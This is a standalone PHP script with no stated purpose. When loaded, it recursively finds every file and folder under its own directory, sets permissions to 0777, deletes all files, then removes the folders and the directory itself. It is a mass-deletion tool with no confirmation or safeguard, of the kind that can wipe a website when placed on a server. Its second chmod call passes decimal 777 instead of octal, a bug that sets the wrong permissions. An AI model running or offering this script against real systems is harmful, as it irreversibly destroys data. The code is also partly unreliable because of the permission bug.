<?php
ini_set("max_execution_time",999); set_time_limit(999);
$dir="./";

function parseDirectory($rootPath, $seperator="/"){
	$fileArray=array();
	if (($handle = opendir($rootPath))!==false) {
		while( ($file = readdir($handle))!==false) {
			if($file !='.' && $file !='..'){
				if (is_dir($rootPath.$seperator.$file)){
					$array=parseDirectory($rootPath.$seperator.$file);
					$fileArray=array_merge($array,$fileArray);
					$fileArray[]=$rootPath.$seperator.$file;
				}
				else {
					$fileArray[]=$rootPath.$seperator.$file;
				}
			}
		}
	}
	return $fileArray;
}

$arr=parseDirectory($dir);


for ($i=0;$i<count($arr);$i++){
	chmod($arr[$i],0777);
	unlink($arr[$i]);
}
$arr=parseDirectory($dir);
for ($i=0;$i<count($arr);$i++){
	chmod($arr[$i],777);
	rmdir($arr[$i]);
}
rmdir($dir);
$arr=parseDirectory($dir);
echo "<pre>";
print_r($arr);
?>